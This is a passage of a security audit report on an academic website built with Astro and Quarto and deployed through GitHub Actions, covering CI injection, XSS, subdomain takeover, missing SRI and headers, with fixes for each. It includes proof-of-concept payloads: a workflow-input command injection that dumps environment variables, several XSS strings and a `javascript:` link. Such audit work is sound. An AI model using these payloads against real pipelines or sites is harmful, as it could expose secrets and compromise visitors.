#### Finding VULN-CI-03: Action References Pinned to Mutable Tags
All workflows reference actions by mutable release tags (e.g. `actions/checkout@v4`, `quarto-dev/quarto-actions/setup@v2`). Git tags can be moved or force-pushed if a maintainer account is compromised. Crucially, `quarto-dev/quarto-actions/setup@v2` executes within `deploy-pages.yml` in a job possessing `pages: write` and `id-token: write` permissions.

#### Dormant Donor Workflows in `astro/.github/workflows/`
The repository contains 3 dormant workflow files in `astro/.github/workflows/` (`preview.yml`, `release.yml`, and `website-deploy.yml`), inherited from the `astro-scholar` starter template. Because GitHub Actions only executes workflows positioned in the repository root `.github/workflows/`, these workflows do not run automatically. However, they present latent configuration and security risks:
- `preview.yml:7-9` explicitly requests elevated permissions on pull requests:
  ```yaml
  permissions:
    contents: write
    pull-requests: write
  ```
- `website-deploy.yml:37` references the repository secret `secrets.PUBLIC_UMAMI_WEBSITE_ID`.
If a contributor or maintainer inadvertently copies or moves these files into root `.github/workflows/`, `preview.yml` would execute on pull requests with write permissions. These unneeded donor files should be deleted during repository cleanup.

#### PR & Fork Execution Security (Positive Assessment)
`functional-tests.yml` and `visual-tests.yml` trigger strictly on `on: pull_request`. Neither workflow uses the dangerous `pull_request_target` trigger. Fork pull requests run with a read-only `GITHUB_TOKEN` and zero access to repository secrets.

---

## 6. Individual Vulnerability Catalog

---

### Finding VULN-CI-01: OS Command / Script Injection via Unquoted Workflow Dispatch Input
- **Severity**: **Medium** (CVSS: 6.7 - `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N`)
- **CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
- **OWASP CI/CD**: CICD-SEC-4 (Poisoned Pipeline Execution)
- **Affected File**: `.github/workflows/update-visual-baselines.yml:84`
- **Technical Explanation**:
  In GitHub Actions, string interpolation using `${{ ... }}` inside a `run:` step performs direct text substitution into the generated shell script before the shell process starts. Because `${{ inputs.reason }}` is placed directly inside double quotes in an inline script without sanitization, any input containing double quotes, command terminators (`;`, `&&`, `|`), or command substitution (`$(...)`, `` `...` ``) breaks out of the `echo` command and executes arbitrary bash commands on the runner.
- **Exploitability Analysis & Conceptual Reproduction Scenario**:
  - *Preconditions*: The actor must have repository write permissions or workflow dispatch invocation privileges.
  - *Conceptual Scenario*: The actor triggers the workflow via the GitHub Actions UI or GitHub CLI, supplying a `reason` containing an embedded command separator:
    ```text
    routine baseline update"; env | base64 | tr -d '\n' > /tmp/env.txt; echo "done
    ```
    When GitHub Actions compiles the step, line 84 expands to:
    ```bash
    echo "  Reason: routine baseline update"; env | base64 | tr -d '\n' > /tmp/env.txt; echo "done"
    ```
    The runner executes the base64 dump of environment variables to `/tmp/env.txt`, demonstrating unauthorized command execution within the runner context.
- **Actionable Remediation**:
  Pass the workflow input via an intermediate environment variable (`env:`). Environment variables are safely exported to the process table and are not interpreted as shell syntax. Furthermore, recommend `printf '  Reason: %s\n' "$INPUT_REASON"` rather than `echo` to prevent flag injection (e.g. if an input string begins with `-n` or `-e`, `echo` interprets it as a command option switch rather than text to print):
  ```yaml
  <<<<
        - name: Instructions
          run: |
            echo "=============================================="
            echo "  Baselines regenerated."
            echo "  Reason: ${{ inputs.reason }}"
            echo ""
            echo "  Download the 'updated-visual-baselines'"
  ====
        - name: Instructions
          env:
            INPUT_REASON: ${{ inputs.reason }}
          run: |
            echo "=============================================="
            echo "  Baselines regenerated."
            printf '  Reason: %s\n' "$INPUT_REASON"
            echo ""
            echo "  Download the 'updated-visual-baselines'"
  >>>>
  ```

---

### Finding VULN-STATIC-01: Dangling Subdomain & Unverified Custom Domain Takeover Risk
- **Severity**: **Medium** (CVSS: 6.5 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`)
- **CWE**: CWE-284 (Improper Access Control)
- **Affected Components**: Domain DNS Records & `PUBLISHING_ARCHITECTURE.md:245-250`
- **Technical Explanation**:
  GitHub Pages routes incoming HTTP traffic by matching the requested `Host` header against repositories that claim that custom domain. If a domain administrator adds a DNS CNAME record pointing a subdomain (e.g. `notes.silviofanzon.com`) to a GitHub Pages target (e.g. `sfanzon-notes.github.io`) before the target GitHub repository is registered and has Pages activated, any GitHub user can configure that custom domain on their own repository. GitHub Pages will recognize the valid DNS CNAME pointing to GitHub infrastructure, provision a valid TLS certificate, and serve the attacker's content under Dr. Silvio Fanzon's subdomain.
- **Exploitability Analysis & Conceptual Reproduction Scenario**:
  - *Conceptual Scenario*:
    1. The domain owner creates DNS CNAME: `notes.silviofanzon.com` -> `sfanzon-notes.github.io`.
    2. The organization `sfanzon-notes` does not yet exist or has not enabled GitHub Pages.
    3. An external actor registers a repository on GitHub and sets its custom domain to `notes.silviofanzon.com`.
    4. The external actor now controls `https://notes.silviofanzon.com`, allowing them to host academic phishing content or harvest visitor data.
- **Actionable Remediation**:
  1. Add DNS TXT verification records to `silviofanzon.com` before creating any CNAME records:
     - `_github-pages-challenge-sfanzon.silviofanzon.com`
     - `_github-pages-challenge-sfanzon-notes.silviofanzon.com`
     - `_github-pages-challenge-sfanzon-technical.silviofanzon.com`
  2. Verify domain ownership in GitHub Account Settings > Pages > Custom domains. Verification locks all subdomains under `silviofanzon.com` strictly to the verified account.

---

### Finding VULN-SRI-01: Missing Subresource Integrity (SRI) on CDN MathJax & Polyfill Scripts
- **Severity**: **Medium** (CVSS: 6.5 - `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N`)
- **CWE**: CWE-353 (Missing Support for Integrity Check)
- **Affected Components**: Merged Quarto Pages in `astro/dist/` (e.g. `docs/index.html:95-96`)
- **Technical Explanation**:
  Quarto injects external scripts from `cdnjs.cloudflare.com` and `cdn.jsdelivr.net` without cryptographic Subresource Integrity (`integrity="sha384-..."`) or `crossorigin="anonymous"` attributes. If either CDN infrastructure is compromised, DNS is hijacked, or a resource is modified upstream (as occurred in the June 2024 `polyfill.io` supply-chain attack), malicious JavaScript will execute with full origin authority in the browser session of every site visitor.
- **Exploitability Analysis & Conceptual Reproduction Scenario**:
  - *Conceptual Scenario*: A malicious actor gains unauthorized access to a third-party CDN bucket or tampers with the CDN caching proxy. The modified `tex-chtml-full.js` script injects a payload that intercepts user clicks or redirects academic visitors. Because the browser receives no `integrity` hash in the HTML tag, it executes the compromised script without error.
- **Actionable Remediation**:
  Configure `_quarto.yml` to use local KaTeX rendering or self-contained math assets:
  ```yaml
  format:
    html:
      html-math-method:
        method: katex
  ```
  Or complete the migration of Quarto pages into native Astro, which compiles math equations at build time via `rehype-katex` with zero runtime client-side CDN scripts.

---

### Finding VULN-INJ-01: Stored Cross-Site Scripting via Unsanitized Data Ingestion into `set:html`
- **Severity**: **Medium** (CVSS: 6.1 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Affected Files**:
  - `scripts/sitegen/news.py:26-42` (`news_body_html`)
  - `scripts/sitegen/publication_rendering.py:170` (`render_publication_entry`)
  - `scripts/sitegen/publications.py:76-89` (`publication_abstract_html`)
  - `scripts/sitegen/presentations.py:65` (`render_presentations_archive`)
  - `scripts/sitegen/teaching.py:132` (`teaching_section`)
- **Technical Explanation**:
  Astro's `set:html` directive injects raw strings directly into the DOM without HTML escaping. The Python pre-rendering scripts format Markdown and BibTeX data into HTML fragments without escaping dynamic input. In `news.py`, Markdown text is formatted using naive regex without `html.escape()`. In `publication_rendering.py`, `publication['title']` is placed into `<h3>` tags unescaped. In `publications.py`, `publication_abstract_html` deliberately outputs raw block-level HTML.
- **Exploitability Analysis & Conceptual Reproduction Scenario**:
  - *Conceptual Scenario*: A collaborator submits a pull request updating `data/publications.bib` with an entry whose title contains:
    ```bibtex
    @article{sample2026,
      title = {Novel Bounds in Calculus <img src=x onerror=alert(document.domain)>},
      ...
    }
    ```
    When `scripts/build-content.py` executes, `publication_rendering.py` outputs:
    ```html
    <h3>Novel Bounds in Calculus <img src=x onerror=alert(document.domain)></h3>
    ```
    When Astro builds the site, `PublicationArchive.astro` injects this via `set:html`. When a visitor views the publications page, the script executes.
- **Actionable Remediation**:
  1. In `scripts/sitegen/publication_rendering.py`, escape publication titles:
     ```python
     <<<<
         return f'''<article class="{row_classes} publication-entry" id="{html.escape(row_id, quote=True)}"><div class="home-publication-main pub-main"><h3>{publication['title']}</h3>
     ====
         return f'''<article class="{row_classes} publication-entry" id="{html.escape(row_id, quote=True)}"><div class="home-publication-main pub-main"><h3>{html.escape(publication['title'])}</h3>
     >>>>
     ```
  2. In `scripts/sitegen/news.py` (News Pipeline):
     - **Important Constraint**: Existing news files (such as `news/2026-03-17.md:10`) legitimately contain HTML anchor tags (`<a href="/publications.html#2026-Fry-Fan-Aus-Bri">...</a>` and `<a href="https://www.silviofanzon.com/assets/pdf/journal/2026-Fry-Fan-Aus-Bri.pdf">here</a>`). Applying naive whole-string `html.escape()` across the entire news body would cause a severe functional regression, corrupting published links across the news archive into literal `&lt;a href=...&gt;` text.
     - **Recommendation A (Canonical Markdown Migration)**: Convert existing anchor tags in `news/*.md` to standard Markdown `[text](url)` link syntax, and enhance `news_inline_html` to parse Markdown links, escaping anchor text with `html.escape()` and validating URLs against `is_safe_url()`.
     - **Recommendation B (Tag-Preserving Sanitizer)**: If raw HTML tags must be permitted in news posts, implement a tag-preserving sanitizer (e.g. using `nh3` or a regex-based tokenizer) that escapes all general text while strictly permitting only safe `<a>` tags whose `href` attributes pass `is_safe_url()`, disallowing dangerous elements (`<script>`, `<iframe>`, `<style>`, `<object>`, event handlers).
  3. In `scripts/sitegen/presentations.py` and `teaching.py`, wrap abstracts in `html.escape()`.

---

### Finding VULN-DEP-01: Dead Dependency `bibliography` Pulling Vulnerable `ret` Package (ReDoS)
- **Severity**: **Medium** (CVSS: 5.3 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`)
- **CWE**: CWE-1333 (Inefficient Regular Expression Complexity)
- **Advisory**: CVE-2021-23648 / GHSA-j527-rv73-vv8r
- **Affected Files**: `astro/package.json:23`, `astro/package-lock.json:5518` (with `randexp` at line 5193)
- **Technical Explanation**:
  `astro/package.json` lists `"bibliography": "^0.1.0"`. This package has not been maintained since 2016 and pulls in 8 transitive dependencies, including `ret@0.1.15` (declared at `astro/package-lock.json:5518`, required by `randexp` at line 5193). The `ret` package contains a regular expression denial-of-service vulnerability when parsing crafted regular expressions. Search across `astro/src/` and `astro/scripts/` demonstrates that `bibliography` is never imported.
- **Actionable Remediation**:
  Delete line 23 from `astro/package.json` and regenerate `astro/package-lock.json`:
  ```json
  <<<<
      "astro": "^6.4.5",
      "bibliography": "^0.1.0",
      "js-yaml": "^4.1.1",
  ====
      "astro": "^6.4.5",
      "js-yaml": "^4.1.1",
  >>>>
  ```
  Run `npm install` in `astro/` to prune the 8 unneeded dependencies.

---

### Finding VULN-STATIC-03: Lack of HSTS & Security Response Headers on Custom Domain
- **Severity**: **Medium** (CVSS: 5.3 - `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information)
- **Affected Component**: GitHub Pages Custom Domain Hosting (`www.silviofanzon.com`)
- **Technical Explanation**:
  GitHub Pages does not send the `Strict-Transport-Security` (HSTS) header on custom domains. Initial visits to `http://www.silviofanzon.com` rely on an unencrypted HTTP 301 redirect. An active adversary on a local network can intercept this plaintext request and strip SSL protection. Furthermore, GitHub Pages lacks custom header configuration, precluding `X-Content-Type-Options: nosniff`, `Permissions-Policy`, and `Cross-Origin-Opener-Policy`.
- **Actionable Remediation**:
  1. Route the custom domain DNS through Cloudflare (free tier) with proxying enabled. Set SSL/TLS to **Full (Strict)**.
  2. Configure Cloudflare Transform Rules to inject standard security headers:
     ```http
     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
     X-Content-Type-Options: nosniff
     X-Frame-Options: SAMEORIGIN
     Referrer-Policy: strict-origin-when-cross-origin
     Permissions-Policy: camera=(), microphone=(), geolocation=()
     ```
  3. Submit `silviofanzon.com` to the Chrome HSTS Preload list (`hstspreload.org`).

---

### Finding VULN-STATIC-04: Inability to Enforce Framing / Clickjacking Protection via HTML Meta Tag
- **Severity**: **Medium** (CVSS: 4.3 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
- **Affected Component**: HTML Meta CSP / `astro/src/components/BaseHead.astro`
- **Technical Explanation**:
  Modern browsers enforce clickjacking protection via the `frame-ancestors` directive in CSP or the legacy `X-Frame-Options` HTTP header. According to the W3C CSP Level 3 specification, browsers **must ignore** `frame-ancestors` when delivered inside an HTML `<meta http-equiv="Content-Security-Policy">` tag. Browsers also ignore `<meta http-equiv="X-Frame-Options">`. Therefore, on a pure GitHub Pages site without an edge reverse proxy, framing cannot be blocked via standard HTML markup.

  Furthermore, classic JavaScript framebusters such as:
  ```javascript
  if (window.top !== window.self) {
    window.top.location = window.self.location;
  }
  ```
  are **trivially bypassed** in modern browsers. An attacker embeds the victim site using an HTML5 sandboxed iframe:
  ```html
  <iframe src="https://www.silviofanzon.com" sandbox="allow-scripts allow-forms"></iframe>
  ```
  Because the sandbox omits `allow-top-navigation`, the browser blocks the assignment to `top.location` with a `SecurityError / DOMException`. The script throws an error and execution halts, while the framed site remains rendered and interactive, leaving users vulnerable to clickjacking / UI redressing.
- **Actionable Remediation**:
  1. **Primary Control**: Route traffic through Cloudflare or an edge proxy to emit genuine HTTP response headers: `X-Frame-Options: SAMEORIGIN` and `Content-Security-Policy: frame-ancestors 'self'`.
  2. **Client-Side Defense-in-Depth (CSS-Hiding Anti-Clickjack Pattern)**:
     If edge proxying is pending, implement the standard CSS-hiding framebuster pattern in `BaseHead.astro`. This approach styles the body as hidden by default and removes the hiding style only after verifying the window is top-level:
     ```html
     <style id="antiClickjack">body{display:none !important;}</style>
     <script is:inline>
       if (self === top) {
         var antiClickjack = document.getElementById("antiClickjack");
         antiClickjack.parentNode.removeChild(antiClickjack);
       } else {
         top.location = self.location;
       }
     </script>
     ```
     Even if an attacker uses `<iframe sandbox="allow-scripts allow-forms">` to block top navigation, the removal script never executes, ensuring the document body remains permanently hidden (`display: none !important;`) inside the malicious frame.

---

### Finding VULN-INJ-02: Pseudo-Protocol Passthrough (`javascript:`) on Dynamic Link Generators
- **Severity**: **Low** (CVSS: 4.3 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **CWE**: CWE-79 (Cross-Site Scripting via URI Scheme)
- **Affected Files**: `scripts/sitegen/presentations.py:40`, `teaching.py:41`, `publication_rendering.py:157`
- **Technical Explanation**:
  In `_presentation_link` and `teaching_link`, URLs are checked only for `startswith(('http://', 'https://', '/'))`. If this evaluates to false and `asset=False`, the input string is passed through directly. If a data record contains `javascript:alert(1)`, it is rendered as `<a class="paper-action" href="javascript:alert(1)">`.
- **Actionable Remediation**:
  Implement strict URL scheme validation that explicitly rejects protocol-relative URLs (`//example.com`):
  ```python
  def is_safe_url(url):
      url = url.strip()
      if url.startswith('//'):
          return False
      return bool(re.match(r'^(?:https?://|mailto:|/(?!/)|#)', url, re.I))
  ```
  *Design Rationale*: A naive regex pattern such as `r'^(?:https?://|mailto:|/|#)'` matches any string beginning with `/`. Because protocol-relative URLs (`//attacker.com/malicious-link`) begin with `/`, they would evaluate to `True` and navigate across origins when clicked in `<a class="paper-action" href="{href}">`, re-introducing the open-redirect/phishing vulnerability flagged in VULN-INJ-04. The check `url.startswith('//')` and negative lookahead `/(?!/)` guarantee that relative paths begin with a single slash only. Reject or neutralize any URL failing this check.

---

### Finding VULN-SRI-02: External CDN Stylesheets Loaded via CSS `@import` Without SRI
- **Severity**: **Low** (CVSS: 3.7 - `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **CWE**: CWE-353 (Missing Support for Integrity Check)
- **Affected File**: `styles/main/_01-foundation.scss:8-9`
- **Technical Explanation**:
  Stylesheets for Font Awesome and Academicons are imported using CSS `@import url('https://cdnjs...')`. CSS `@import` syntax does not support SRI hashes. If either CDN is compromised, an attacker can deliver malicious CSS capable of data exfiltration or UI manipulation.
- **Actionable Remediation**:
  Vendor Font Awesome and Academicons locally in `assets/css/` and `assets/webfonts/`, or load them via `<link rel="stylesheet">` with `integrity` and `crossorigin` attributes in the HTML `<head>`.

---

### Finding VULN-INJ-04: Protocol-Relative Open Iframe Redirection & Missing Sandbox in Viewports Route
- **Severity**: **Low** (CVSS: 3.7 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-1021 / CWE-601 (Open Redirect / Missing Iframe Sandbox)
- **Affected File**: `astro/src/pages/dev/viewports.astro:112-116,187-191`
- **Technical Explanation**:
  In `dev/viewports.astro`, `loadRoute(path)` tests `requestedPath.startsWith('/')`. Protocol-relative URLs such as `//attacker.com` start with `/`, causing the browser to navigate the iframe to `https://attacker.com`. Furthermore, the `<iframe>` tags lack a `sandbox` attribute, allowing the embedded document to run scripts and display misleading content.
- **Actionable Remediation**:
  1. Add `sandbox="allow-same-origin allow-scripts"` to preview iframes.
  2. Prevent protocol-relative URLs:
     ```typescript
     if (requestedPath.startsWith('/') && !requestedPath.startsWith('//')) { ... }
     ```
  3. Exclude `/dev/` routes from production builds.

---

### Finding VULN-INJ-03: Attribute Breakout in `team.astro` via Single-Quote Handling
- **Severity**: **Low** (CVSS: 3.5 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-79 / CWE-116 (Improper Output Handling)
- **Affected Files**: `astro/src/pages/team.astro:171`, `astro/src/utils/avatar.ts:27`
- **Technical Explanation & Exploitability Analysis**:
  In `team.astro`, the inline attribute:
  ```astro
  onerror={`this.onerror=null;this.src='${profile.fallbackAvatar}'`}
  ```
  embeds the SVG fallback data URI inside single quotes. Because `encodeURIComponent` does not encode single quotes (`'`), author names containing apostrophes break out of the JavaScript string literal delimiter.

  Crucially, an adversarial author name such as `test'-alert(1)-'` results in `aria-label="test'-alert(1)-'"` within the generated SVG in `avatar.ts`. When interpolated into `team.astro`, the unencoded apostrophe breaks out of the single-quoted string:
  ```html
  onerror="this.onerror=null;this.src='data:image/svg+xml...aria-label=&quot;test'-alert(1)-'...'"
  ```
  In JavaScript, `string - alert(1) - string` constructs a valid subtraction expression where `alert(1)` executes immediately upon image load error.

  *Context & Defense-in-Depth*: In the current production pipeline, `build-site.mjs` purges `dist/team` during the Quarto/Astro production merge. However, if Astro is built standalone (`npm run build:astro`) or if team profile pages are published in the future, this constitutes an active stored XSS vector.
- **Actionable Remediation**:
  Replace inline `onerror` attributes with progressive event listeners in a bundled `<script>`, or explicitly replace `'` with `%27` in `avatar.ts:48`:
  ```typescript
  return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg).replace(/'/g, '%27')}`;
  ```

---

### Finding VULN-CI-02: Missing Explicit Least-Privilege `permissions:` Declaration in Workflows
- **Severity**: **Low** (CVSS: 3.5 - `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N`)
- **CWE**: CWE-250 (Execution with Unnecessary Privileges)
- **Affected Files**: `.github/workflows/functional-tests.yml`, `update-visual-baselines.yml`, `visual-tests.yml`
- **Technical Explanation**:
  Workflows that omit a top-level `permissions:` block inherit the default repository permissions, which often grant broad read/write access. If a dependency or build tool executes untrusted code, an over-privileged `GITHUB_TOKEN` in the runner environment allows repository modification.
- **Actionable Remediation**:
  Add an explicit top-level `permissions: contents: read` block to each workflow file:
  ```yaml
  permissions:
    contents: read
  ```

---

### Finding VULN-CI-03: Actions Pinned to Mutable Release Tags Instead of Immutable Commit SHAs
- **Severity**: **Low** (CVSS: 3.3 - `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N`)
- **CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- **Affected Files**: All 4 Workflows in `.github/workflows/`
- **Technical Explanation**:
  Workflows reference actions via mutable Git tags (e.g. `@v4`, `@v2`). If an upstream maintainer account is compromised or a tag is force-pushed, the CI/CD runner will pull the altered code. In `deploy-pages.yml`, third-party action `quarto-dev/quarto-actions/setup@v2` runs in a job holding deployment privileges.
- **Actionable Remediation**:
  Pin all action references to full 40-character commit SHAs with release tag comments:
  ```yaml
  - name: Setup Quarto
    uses: quarto-dev/quarto-actions/setup@b80a427cb1738734e565ea7e305f88fcad219d26 # v2.1.7
  ```

---

### Finding VULN-STATIC-07: Incomplete Root `.gitignore` Lacking Environment File Safeguards
- **Severity**: **Low** (CVSS: 3.3 - `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-200 (Exposure of Sensitive Information)
- **Affected File**: Root `.gitignore`
- **Technical Explanation**:
  The root `.gitignore` lacks rules for `.env*`, `*.pem`, `*.key`, and `astro/dist/`. If environment configuration files or certificates are created in the project root during local testing, they risk being tracked and committed.
- **Actionable Remediation**:
  Append the following lines to root `.gitignore`:
  ```gitignore
  .env
  .env.*
  *.pem
  *.key
  id_rsa
  astro/dist/
  ```

---

### Finding VULN-STATIC-02: Missing In-Artifact Declarative CNAME in Deployment Pipeline
- **Severity**: **Low** (CVSS: 3.1 - `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:L`)
- **CWE**: CWE-668 (Exposure of Resource to Wrong Sphere)
- **Affected Files**: `astro/public/CNAME`, `astro/scripts/build-site.mjs`
- **Technical Explanation**:
  `actions/upload-pages-artifact@v3` packages `astro/dist/`. Because no `CNAME` file is present in `astro/public/`, the deployed artifact contains no declarative record of `www.silviofanzon.com`. If repository web UI settings are reset, custom domain routing breaks.
- **Actionable Remediation**:
  Create `astro/public/CNAME` containing:
  ```text
  www.silviofanzon.com
  ```

---

### Finding VULN-STATIC-05: Exposure of Donor Template Contact Data & Resume Link in `consts.ts`
- **Severity**: **Low** (CVSS: 3.1 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-200 (Exposure of Sensitive Information)
- **Affected Files**: `astro/src/consts.ts`, `astro/src/content/blog/`
- **Technical Explanation**:
  `astro/src/consts.ts` contains placeholder details from the template creator ("Shravan Goswami"). Direct execution of `npm run build` or `astro build` generates donor blog posts and publishes third-party contact details to `dist/`.
- **Actionable Remediation**:
  Update `astro/src/consts.ts` with Dr. Silvio Fanzon's canonical details and delete `astro/src/content/blog/`.

---

### Finding VULN-NET-01: Build-Time Remote Font Fetching in `generateOgImage.ts`
- **Severity**: **Low** (CVSS: 3.1 - `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L`)
- **CWE**: CWE-400 / CWE-494 (Uncontrolled Resource Consumption / Download Without Integrity)
- **Affected File**: `astro/src/utils/generateOgImage.ts:5-14`
- **Technical Explanation**:
  During build, `generateOgImage.ts` fetches font binaries from Google Fonts over HTTP and feeds them into native parsing libraries (`satori`, `resvg-js`). This creates build fragility on networks with restricted egress and exposes the build environment to binary font parsing risks.
- **Actionable Remediation**:
  Store static font files in `astro/src/assets/fonts/` and load them synchronously via `fs.readFileSync()`.

---

### Finding VULN-STATIC-06: Potential Public Exposure & Indexing of Development Tooling Routes (`/dev/`)
- **Severity**: **Low** (CVSS: 2.6 - `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-200 (Exposure of Sensitive Information)
- **Affected Files**: `astro/src/pages/robots.txt.ts`, `astro/src/pages/dev/`
- **Technical Explanation**:
  Test workbench routes (`/dev/viewports/`, `/dev/kitchen-sink/`) are built into `dist/dev/` when dev tools are enabled. `robots.txt.ts` lacks a disallow rule for `/dev/`, allowing web crawlers to index development testing interfaces.
- **Actionable Remediation**:
  Add `Disallow: /dev/` to `astro/src/pages/robots.txt.ts` and ensure production CI builds omit `--include-dev-tools`.

---

### Finding VULN-STATIC-08: Sitemap Endpoint Desynchronization in `robots.txt.ts`
- **Severity**: **Informative**
- **Affected File**: `astro/src/pages/robots.txt.ts:8`
- **Technical Explanation**:
  `robots.txt.ts` advertises `sitemap-index.xml`, but `build-site.mjs` generates `sitemap.xml`. Search crawlers following `robots.txt` will encounter an HTTP 404 error.
- **Actionable Remediation**:
  Update line 8 of `astro/src/pages/robots.txt.ts` to specify `sitemap.xml`.

---

### Finding VULN-INJ-06: Implicit Mermaid Runtime Security Configuration
- **Severity**: **Informative**
- **CWE**: CWE-1188 (Insecure Default Initialization of Resource)
- **Affected File**: `docs/site_libs/quarto-diagram/mermaid-init.js:1-5`
- **Technical Explanation**:
  While Mermaid defaults to `securityLevel: 'strict'`, `mermaidOpts` in `mermaid-init.js` does not explicitly declare it. Explicit declaration guards against future library default changes.
- **Actionable Remediation**:
  Add `securityLevel: 'strict'` to `mermaidOpts` in `mermaid-init.js`.

---

## 7. GitHub Pages-Specific Hosting Implications & Limitations

### 7.1 Response Header Restrictions & Workarounds
GitHub Pages provides a simple, robust static hosting platform, but has architectural limitations regarding HTTP response headers:
1. **Header Inflexibility**: GitHub Pages does not support configuration files like Netlify's `_headers` or Cloudflare Pages' `_headers`. It is impossible to configure custom response headers natively within GitHub repository configuration.
2. **Missing Security Headers**: GitHub Pages custom domains omit HSTS, `X-Frame-Options`, and CSP headers.
3. **Overcoming Limitations via Edge Reverse Proxy**:
   The recommended enterprise architecture for securing a custom domain on GitHub Pages is placing an edge CDN/proxy layer (such as Cloudflare) in front of GitHub Pages:
   - Point DNS NS records to Cloudflare.
   - Set Cloudflare SSL/TLS encryption mode to **Full (Strict)**.
   - Configure a Cloudflare Transform Rule to inject security headers on all responses:
     ```http
     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
     X-Content-Type-Options: nosniff
     X-Frame-Options: SAMEORIGIN
     Referrer-Policy: strict-origin-when-cross-origin
     Permissions-Policy: camera=(), microphone=(), geolocation=()
     Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https://cloud.umami.is; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://cloud.umami.is; worker-src 'self' blob:; frame-ancestors 'self'; base-uri 'self'; form-action 'self';
     ```

   *CSP Directive Analysis & Integration Requirements*:
   - `https://cloud.umami.is`: Configured in `astro/src/consts.ts:58` for Umami analytics (`UMAMI_SRC`). Must be permitted in both `script-src` (loading tracking script) and `connect-src` (sending tracking beacon telemetry) to prevent runtime CSP violations when analytics are enabled.
   - `worker-src 'self' blob:` and `script-src ... 'wasm-unsafe-eval'`: Required by Pagefind search (`SiteSearch.astro`), which compiles WebAssembly indexes and initializes client-side Web Workers via blob URIs.
   - `frame-ancestors 'self'`: Prevents clickjacking framing (enforced at the edge HTTP response level; browsers ignore this in meta tags).

4. **Static Fallback `<meta>` Tag in `BaseHead.astro`**:
   For deployments served directly from GitHub Pages without Cloudflare, add the following `<meta>` tag to `astro/src/components/BaseHead.astro`:
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https://cloud.umami.is; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://cloud.umami.is; worker-src 'self' blob:; base-uri 'self'; form-action 'self';">
   ```

### 7.2 Custom Domain Takeover & Ownership Verification
To eliminate subdomain takeover risks across the planned multi-repository topology (`notes.silviofanzon.com`, `technical.silviofanzon.com`):
1. Navigate to **GitHub Account Settings > Pages > Custom domains**.
2. Add `silviofanzon.com` and obtain the domain verification TXT record.
3. In domain registrar DNS, create a TXT record:
   - Host: `_github-pages-challenge-sfanzon`
   - Value: `<token provided by GitHub>`
4. Repeat for any future GitHub organization namespaces (`sfanzon-notes`, `sfanzon-technical`).
5. Only after domain verification is confirmed should DNS CNAME records be created pointing to `*.github.io`.

---

## 8. Remediation Action Plan & Verification Methods

### 8.1 Prioritized Remediation Roadmap

```text
+---------------------------------------------------------------------------------------+
|                               SECURITY REMEDIATION ROADMAP                            |
+---------------------------------------------------------------------------------------+

[PHASE 1: IMMEDIATE / PRE-MERGE]
  1. Patch GitHub Actions Command Injection:
     - In .github/workflows/update-visual-baselines.yml:84, pass ${{ inputs.reason }} via env.
     - Use printf '  Reason: %s\n' "$INPUT_REASON" to prevent flag injection.
  2. Sanitize Pre-Rendering Ingestion Pipelines:
     - In scripts/sitegen/publication_rendering.py:170, wrap publication['title'] in html.escape().
     - In scripts/sitegen/news.py, sanitize inline Markdown while preserving legitimate <a> tags (or migrate news/*.md links to standard Markdown syntax).
     - In scripts/sitegen/presentations.py & teaching.py, wrap abstracts in html.escape().
     - Harden is_safe_url() to reject protocol-relative URLs (//).
  3. Prune Dead Dependency & Dormant Workflows:
     - Remove "bibliography": "^0.1.0" from astro/package.json and run npm install in astro/.
     - Prune dormant starter workflows in astro/.github/workflows/ (preview.yml, release.yml, website-deploy.yml).
  4. Add Declarative CNAME & Gitignore Rules:
     - Create astro/public/CNAME with "www.silviofanzon.com".
     - Add .env*, *.pem, *.key, astro/dist/ to root .gitignore.
  5. Add Referrer-Policy, Anti-Clickjack Style, & Compatible Meta CSP:
     - Add <meta name="referrer" content="strict-origin-when-cross-origin"> to BaseHead.astro.
     - Add anti-clickjack CSS-hiding pattern to BaseHead.astro.
     - Add compatible meta CSP tag to BaseHead.astro including https://cloud.umami.is in script-src/connect-src and worker-src 'self' blob: / 'wasm-unsafe-eval' for Pagefind.

